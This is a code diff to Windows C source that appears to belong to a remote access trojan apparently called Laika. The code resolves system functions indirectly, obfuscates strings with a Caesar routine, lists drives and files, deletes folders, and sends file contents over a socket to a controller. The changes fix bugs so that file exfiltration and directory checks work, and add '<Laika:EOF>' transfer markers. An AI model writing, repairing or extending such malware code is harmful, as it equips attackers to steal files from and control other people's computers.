@@ -17,22 +17,25 @@ int get_drives_list(char* buf) {
     return count; // return number of drives found
 }
 
-char get_obj_info(const char* dirPath) {
-    char result = 'N';
-    HANDLE hFind = NULL;
-    WIN32_FIND_DATA findData;
+char get_obj_info(const char* path) {
+    WCHAR widePath[MAX_PATH];
+    DWORD attributes;
 
-    WCHAR searchPath[MAX_PATH];
-    mbstowcs_(searchPath, dirPath, MAX_PATH);
+    if (mbstowcs_(widePath, path, MAX_PATH) == (size_t)-1) {
+        return 'N';
+    }
+    attributes = Api.GetFileAttributesW(widePath);
 
-    wcscat(searchPath, L"\\*.*");
-    hFind = Api.FindFirstFileW(searchPath, &findData);
+    if (attributes == INVALID_FILE_ATTRIBUTES) {
+        return 'N';  // Path doesn't exist or can't be accessed
+    }
 
-	if (hFind == INVALID_HANDLE_VALUE)
-		return result;
-	result = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 'd' : 'f';
-	Api.FindClose(hFind);
-    return result;
+    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
+        return 'd';  // It's a directory
+    }
+    else {
+        return 'f';  // It's a file
+    }
 }
 
 char* get_file_list(const char* dirPath, int* numFiles) {
@@ -72,7 +75,7 @@ char* get_file_list(const char* dirPath, int* numFiles) {
             fileList = (char**)Api.HeapReAlloc(_crt_heap, HEAP_ZERO_MEMORY, fileList, maxFiles * sizeof(char*));
         }
         fileList[numFound] = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, strlen(fileName) + 1);
-        strcpy(fileList[numFound], CAESAR(fileName));
+        strcpy(fileList[numFound], fileName);
         numFound++;
     } while (Api.FindNextFileW(hFind, &findData) != 0);
 
@@ -100,7 +103,7 @@ char* get_file_list(const char* dirPath, int* numFiles) {
     // Set the numFiles parameter to the number of files/folders found
     *numFiles = numFound;
 
-    return fileNames;
+    return CAESAR(fileNames);
 }
 
 BOOL delete_folder(LPCTSTR lpszDir) {
@@ -122,7 +125,7 @@ BOOL delete_folder(LPCTSTR lpszDir) {
     }
 
     do {
-        if (Api.lstrcpyW(FindFileData.cFileName, TEXT(".")) == 0 || Api.lstrcpyW(FindFileData.cFileName, TEXT("..")) == 0) {
+        if (wcscmp_(FindFileData.cFileName, TEXT(".")) == 0 || wcscmp_(FindFileData.cFileName, TEXT("..")) == 0) {
             // skip the current and parent directories
             continue;
         }
@@ -166,7 +169,7 @@ int download_file(HANDLE fp, SOCKET sock) {
 
     // Send the contents of the file through the socket
     while (1) {
-        Api.WriteFile(fp, data, BUFFER_SIZE, &bytes_read, NULL);
+        Api.ReadFile(fp, data, BUFFER_SIZE, &bytes_read, NULL);
         if (bytes_read == 0) {
             break;
         }
@@ -190,6 +193,7 @@ int download_file(HANDLE fp, SOCKET sock) {
                     }
                 }
                 else {
+					Api.send(sock, "<Laika:EOF>", strlen("<Laika:EOF>"), 0);
                     Api.HeapFree(_crt_heap, 0, data);
                     Api.CloseHandle(fp);
                     Sleep_(Sleep_TIME);
@@ -203,6 +207,7 @@ int download_file(HANDLE fp, SOCKET sock) {
         }
     }
 
+	Api.send(sock, "<Laika:EOF>", strlen("<Laika:EOF>"), 0);
     Api.CloseHandle(fp);
     Api.HeapFree(_crt_heap, 0, data);
 
